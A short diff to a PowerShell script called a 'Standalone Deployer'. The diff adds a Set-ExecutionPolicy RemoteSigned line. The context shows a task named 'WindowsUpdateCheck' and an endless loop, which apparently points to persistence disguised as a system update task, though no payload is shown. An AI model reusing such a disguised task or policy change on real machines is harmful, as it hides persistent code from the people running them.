@@ -1,3 +1,5 @@
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+
 # d.ps1 - Standalone Deployer (C:\Program Files\) - INDEPENDENT EXECUTION
 $pf = "C:\Program Files\"
 $task = "WindowsUpdateCheck"
@@ -33,3 +35,4 @@ while($true) {
         Start-Sleep 30 
     }
 }
+
